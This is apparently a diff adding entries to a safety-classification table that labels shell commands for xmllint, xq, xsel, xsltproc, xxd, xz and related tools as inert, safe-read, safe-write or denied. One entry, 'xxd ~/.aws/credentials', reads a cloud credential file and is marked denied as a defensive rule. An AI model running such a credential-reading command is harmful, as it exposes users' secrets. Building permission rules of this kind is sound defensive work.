+xmllint --memory	inert
+xmllint --noblanks	inert
+xmllint --nocatalogs	inert
+xmllint --nocdata	inert
+xmllint --nocompact	inert
+xmllint --nodefdtd	inert
+xmllint --noenc	inert
+xmllint --noent	inert
+xmllint --nonet	inert
+xmllint --noout	inert
+xmllint --nowarning	inert
+xmllint --nowrap	inert
+xmllint --nsclean	inert
+xmllint --oldxml10	inert
+xmllint --path x	inert
+xmllint --pattern x	inert
+xmllint --postvalid	inert
+xmllint --pretty x	inert
+xmllint --push	inert
+xmllint --pushsmall	inert
+xmllint --quiet	inert
+xmllint --recover	inert
+xmllint --relaxng x	inert
+xmllint --repeat	inert
+xmllint --sax	inert
+xmllint --sax1	inert
+xmllint --schema x	inert
+xmllint --schematron x	inert
+xmllint --stream	inert
+xmllint --testIO	inert
+xmllint --timing	inert
+xmllint --valid	inert
+xmllint --version	inert
+xmllint --walker	inert
+xmllint --xinclude	inert
+xmllint --xmlout	inert
+xmllint --xpath x	inert
+xmllint -V	inert
+xmllint -h	inert
+xmllint x	inert
+xpath	inert
+xpath --help	denied
+xpath --version	denied
+xpath -e x	inert
+xpath -n	inert
+xpath -n -e x	inert
+xpath -n -q	inert
+xpath -n x	inert
+xpath -p x	inert
+xpath -q	inert
+xpath -s x	inert
+xpath x	inert
+xq	denied
+xq --arg x	inert
+xq --argjson x	inert
+xq --compact-output	inert
+xq --compact-output --arg x	inert
+xq --compact-output --exit-status	inert
+xq --compact-output x	inert
+xq --exit-status	inert
+xq --help	inert
+xq --indent x	inert
+xq --null-input	inert
+xq --raw-input	inert
+xq --raw-output	inert
+xq --slurp	inert
+xq --sort-keys	inert
+xq --tab	inert
+xq --version	inert
+xq --xml-dtd x	inert
+xq --xml-item-depth x	inert
+xq --xml-output	inert
+xq --xml-root x	inert
+xq -C	inert
+xq -M	inert
+xq -R	inert
+xq -S	inert
+xq -V	inert
+xq -c	inert
+xq -e	inert
+xq -f x	inert
+xq -h	inert
+xq -n	inert
+xq -r	inert
+xq -s	inert
+xq -x	inert
+xq x	inert
+xsel	safe-read
+xsel --append	safe-read
+xsel --append --clear	safe-read
+xsel --append --display x	safe-read
+xsel --append x	safe-read
+xsel --clear	safe-read
+xsel --clipboard	safe-read
+xsel --delete	safe-read
+xsel --display	safe-read
+xsel --display x	safe-read
+xsel --exchange	safe-read
+xsel --follow	safe-read
+xsel --help	safe-read
+xsel --input	safe-read
+xsel --keep	safe-read
+xsel --logfile	safe-read
+xsel --logfile x	safe-read
+xsel --nodaemon	safe-read
+xsel --nodetach	safe-read
+xsel --output	safe-read
+xsel --primary	safe-read
+xsel --secondary	safe-read
+xsel --selection-name	safe-read
+xsel --selection-name x	safe-read
+xsel --trailing-newline	safe-read
+xsel --verbose	safe-read
+xsel --version	safe-read
+xsel --zeroflush	safe-read
+xsel -?	safe-read
+xsel -a	safe-read
+xsel -b	safe-read
+xsel -c	safe-read
+xsel -d	safe-read
+xsel -f	safe-read
+xsel -h	safe-read
+xsel -i	safe-read
+xsel -k	safe-read
+xsel -l	safe-read
+xsel -n	safe-read
+xsel -o	safe-read
+xsel -p	safe-read
+xsel -r	safe-read
+xsel -s	safe-read
+xsel -t	safe-read
+xsel -v	safe-read
+xsel -x	safe-read
+xsel x	safe-read
+xsltproc	denied
+xsltproc --catalogs	safe-write
+xsltproc --catalogs --debug	safe-write
+xsltproc --catalogs --maxparserdepth x	safe-write
+xsltproc --catalogs x	safe-write
+xsltproc --debug	safe-write
+xsltproc --debugger	safe-write
+xsltproc --dumpextensions	safe-write
+xsltproc --encoding	safe-write
+xsltproc --help	safe-write
+xsltproc --html	safe-write
+xsltproc --load-trace	safe-write
+xsltproc --maxdepth	safe-write
+xsltproc --maxparserdepth x	safe-write
+xsltproc --maxvars x	safe-write
+xsltproc --noblanks	safe-write
+xsltproc --nodict	safe-write
+xsltproc --nomkdir	safe-write
+xsltproc --nonet	safe-write
+xsltproc --novalid	safe-write
+xsltproc --nowrite	safe-write
+xsltproc --output x	safe-write
+xsltproc --param x	safe-write
+xsltproc --pedantic	safe-write
+xsltproc --profile	safe-write
+xsltproc --repeat	safe-write
+xsltproc --stringparam x	safe-write
+xsltproc --timing	safe-write
+xsltproc --verbose	safe-write
+xsltproc --version	safe-write
+xsltproc --writesubtree	safe-write
+xsltproc --xinclude	safe-write
+xsltproc -V	safe-write
+xsltproc -o x	safe-write
+xsltproc -p x	safe-write
+xsltproc -v	safe-write
+xsltproc x	safe-write
+xsubpp	denied
+xsubpp --help	denied
+xsubpp --version	denied
+xsubpp -C++	safe-write
+xsubpp -C++ -except	safe-write
+xsubpp -C++ -output x	safe-write
+xsubpp -C++ x	safe-write
+xsubpp -except	safe-write
+xsubpp -hiertype	safe-write
+xsubpp -noargtypes	safe-write
+xsubpp -noinout	safe-write
+xsubpp -nolinenumbers	safe-write
+xsubpp -nooptimize	safe-write
+xsubpp -noversioncheck	safe-write
+xsubpp -output x	safe-write
+xsubpp -prototypes	safe-write
+xsubpp -s x	safe-write
+xsubpp -strip x	safe-write
+xsubpp -typemap x	safe-write
+xsubpp -v	safe-write
+xsubpp Module.xs	safe-write
+xsubpp x	safe-write
+xsv	denied
+xsv --help	inert
+xsv --help --version	inert
+xsv --help x	inert
+xsv --version	inert
+xsv -h	inert
+xsv x	inert
+xv	denied
+xv --help	inert
+xv --help --version	inert
+xv --help x	inert
+xv --version	inert
+xv -V	inert
+xv -h	inert
+xv x	inert
+xxd	inert
+xxd --autoskip	inert
+xxd --autoskip --bits	inert
+xxd --autoskip --color x	inert
+xxd --autoskip x	inert
+xxd --bits	inert
+xxd --capitalize	inert
+xxd --color x	inert
+xxd --cols x	inert
+xxd --decimal	inert
+xxd --ebcdic	inert
+xxd --groupsize x	inert
+xxd --help	inert
+xxd --include	inert
+xxd --len x	inert
+xxd --little-endian	inert
+xxd --name x	inert
+xxd --offset x	inert
+xxd --plain	inert
+xxd --postscript	inert
+xxd --revert	inert
+xxd --seek x	inert
+xxd --uppercase	inert
+xxd --version	inert
+xxd -C	inert
+xxd -E	inert
+xxd -R x	inert
+xxd -V	inert
+xxd -a	inert
+xxd -b	inert
+xxd -c x	inert
+xxd -c16 f	inert
+xxd -d	inert
+xxd -e	inert
+xxd -g x	inert
+xxd -h	inert
+xxd -i	inert
+xxd -l x	inert
+xxd -n x	inert
+xxd -o x	inert
+xxd -p	inert
+xxd -r	inert
+xxd -s x	inert
+xxd -u	inert
+xxd file | head -20	inert
+xxd some/file	inert
+xxd x	inert
+xxd ~/.aws/credentials	denied
+xz	safe-write
+xz --block-size x	safe-write
+xz --check	safe-write
+xz --check --block-size x	safe-write
+xz --check --compress	safe-write
+xz --check x	safe-write
+xz --compress	safe-write
+xz --decompress	safe-write
+xz --delta x	safe-write
+xz --extreme	safe-write
+xz --fast	safe-write
+xz --files	safe-write
+xz --files x	safe-write
+xz --files0	safe-write
+xz --files0 x	safe-write
+xz --filters x	safe-write
+xz --filters1 x	safe-write
+xz --filters2 x	safe-write
+xz --filters3 x	safe-write
+xz --filters4 x	safe-write
+xz --flush-timeout x	safe-write
+xz --force	safe-write
+xz --format	safe-write
+xz --format x	safe-write
+xz --help	safe-write
+xz --ignore-check	safe-write
+xz --info-alloc	safe-write
+xz --keep	safe-write
+xz --list	safe-write
+xz --lzma1	safe-write
+xz --lzma1 x	safe-write
+xz --lzma2	safe-write
+xz --lzma2 x	safe-write
+xz --memlimit	safe-write
+xz --memlimit-compress	safe-write
+xz --memlimit-compress x	safe-write
+xz --memlimit-decompress	safe-write
+xz --memlimit-decompress x	safe-write
+xz --memlimit-mt-decompress	safe-write
+xz --memlimit-mt-decompress x	safe-write
+xz --memory x	safe-write
+xz --no-adjust	safe-write
+xz --no-sparse	safe-write
+xz --no-warn	safe-write
+xz --presets x	safe-write
+xz --quiet	safe-write
+xz --robot	safe-write
+xz --single-stream	safe-write
+xz --stdout	safe-write
+xz --suffix	safe-write
+xz --suffix x	safe-write
+xz --threads	safe-write
+xz --threads x	safe-write
+xz --to-stdout	safe-write
+xz --uncompress	safe-write
+xz --verbose	safe-write
+xz --version	safe-write
+xz --x86 x	safe-write
+xz -0	safe-write
+xz -1	safe-write
+xz -2	safe-write
+xz -3	safe-write
+xz -4	safe-write
+xz -5	safe-write
+xz -6	safe-write
+xz -7	safe-write
+xz -8	safe-write
+xz -9	safe-write
+xz -C	safe-write
+xz -C x	safe-write
+xz -F	safe-write
+xz -F x	safe-write
+xz -H	safe-write
+xz -M x	safe-write
+xz -Q	safe-write
+xz -S x	safe-write
+xz -T	safe-write
+xz -T x	safe-write
+xz -V	safe-write
+xz -c	safe-write
+xz -d	safe-write
+xz -e	safe-write
+xz -f	safe-write
+xz -h	safe-write
+xz -k	safe-write
+xz -l	safe-write
+xz -q	safe-write
+xz -t	safe-write
+xz -v	safe-write
+xz -z	safe-write
+xz x	safe-write
+xzcat	safe-write
+xzcat --block-size x	safe-write
+xzcat --check	safe-write
+xzcat --check --block-size x	safe-write
+xzcat --check --compress	safe-write
+xzcat --check x	safe-write
+xzcat --compress	safe-write
+xzcat --decompress	safe-write
+xzcat --delta x	safe-write
+xzcat --extreme	safe-write
+xzcat --fast	safe-write
+xzcat --files	safe-write
+xzcat --files x	safe-write
+xzcat --files0	safe-write
+xzcat --files0 x	safe-write
+xzcat --filters x	safe-write
+xzcat --filters1 x	safe-write
+xzcat --filters2 x	safe-write
+xzcat --filters3 x	safe-write
+xzcat --filters4 x	safe-write
+xzcat --flush-timeout x	safe-write
+xzcat --force	safe-write
+xzcat --format	safe-write
+xzcat --format x	safe-write
+xzcat --help	safe-write
+xzcat --ignore-check	safe-write
+xzcat --info-alloc	safe-write
+xzcat --keep	safe-write
+xzcat --list	safe-write
+xzcat --lzma1	safe-write
+xzcat --lzma1 x	safe-write
+xzcat --lzma2	safe-write
+xzcat --lzma2 x	safe-write
+xzcat --memlimit	safe-write
+xzcat --memlimit-compress	safe-write
+xzcat --memlimit-compress x	safe-write
+xzcat --memlimit-decompress	safe-write
+xzcat --memlimit-decompress x	safe-write
+xzcat --memlimit-mt-decompress	safe-write
+xzcat --memlimit-mt-decompress x	safe-write
+xzcat --memory x	safe-write
+xzcat --no-adjust	safe-write
+xzcat --no-sparse	safe-write
+xzcat --no-warn	safe-write
+xzcat --presets x	safe-write
+xzcat --quiet	safe-write
+xzcat --robot	safe-write
+xzcat --single-stream	safe-write
+xzcat --stdout	safe-write
+xzcat --suffix	safe-write
+xzcat --suffix x	safe-write
+xzcat --threads	safe-write
+xzcat --threads x	safe-write
+xzcat --to-stdout	safe-write
+xzcat --uncompress	safe-write
+xzcat --verbose	safe-write
+xzcat --version	safe-write
+xzcat --x86 x	safe-write
+xzcat -0	safe-write
+xzcat -1	safe-write
+xzcat -2	safe-write
+xzcat -3	safe-write
+xzcat -4	safe-write
+xzcat -5	safe-write
+xzcat -6	safe-write
+xzcat -7	safe-write
+xzcat -8	safe-write
+xzcat -9	safe-write
+xzcat -C	safe-write
+xzcat -C x	safe-write
+xzcat -F	safe-write
+xzcat -F x	safe-write
+xzcat -H	safe-write
+xzcat -M x	safe-write
+xzcat -Q	safe-write
+xzcat -S x	safe-write
+xzcat -T	safe-write
+xzcat -T x	safe-write
+xzcat -V	safe-write
+xzcat -c	safe-write
+xzcat -d	safe-write
+xzcat -e	safe-write
+xzcat -f	safe-write
+xzcat -h	safe-write
+xzcat -k	safe-write
+xzcat -l	safe-write
+xzcat -q	safe-write
+xzcat -t	safe-write
+xzcat -v	safe-write
+xzcat -z	safe-write
+xzcat x	safe-write
+xzcmp	denied
+xzcmp --help	inert
+xzcmp --help --version	inert
+xzcmp --help x	inert
+xzcmp --version	inert
+xzcmp x	inert
+xzdec	inert
+xzdec --decompress	inert
+xzdec --decompress --help	inert
+xzdec --decompress x	inert
+xzdec --help	inert
+xzdec --keep	inert
+xzdec --no-warn	inert
+xzdec --quiet	inert
+xzdec --stdout	inert
+xzdec --to-stdout	inert
+xzdec --uncompress	inert
+xzdec --version	inert
+xzdec -Q	inert
+xzdec -V	inert
+xzdec -c	inert
+xzdec -d	inert
+xzdec -h	inert
+xzdec -k	inert
+xzdec -q	inert
+xzdec x	inert
+xzdiff	denied
+xzdiff --help	inert
+xzdiff --help --version	inert
+xzdiff --help x	inert
+xzdiff --version	inert
+xzdiff x	inert
+xzegrep	denied
+xzegrep --help	denied
+xzegrep --version	denied
+xzegrep x	inert
+xzfgrep	denied
+xzfgrep --help	denied
+xzfgrep --version	denied
+xzfgrep x	inert
+xzgrep	denied
+xzgrep --help	denied
+xzgrep --version	denied
+xzgrep x	inert
+xzless	inert
+xzless --help	denied
+xzless --version	denied
+xzless x	inert
+xzmore	inert
+xzmore --help	denied
+xzmore --version	denied
+xzmore x	inert
